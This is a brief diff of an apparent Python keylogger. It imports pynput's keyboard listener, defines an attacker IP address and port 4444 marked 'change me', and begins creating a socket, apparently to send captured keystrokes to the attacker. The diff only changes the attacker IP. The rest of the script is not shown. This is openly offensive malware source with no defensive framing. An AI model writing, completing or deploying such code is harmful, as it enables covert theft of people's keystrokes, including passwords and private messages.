@@ -4,7 +4,7 @@ import time
 from pynput import keyboard
 
 # Set the attacker's IP address and port
-ATTACKER_IP = "192.168.1.65"  # change me
+ATTACKER_IP = "192.168.1.70"  # change me
 ATTACKER_PORT = 4444  # change me
 
 # Create a socket object
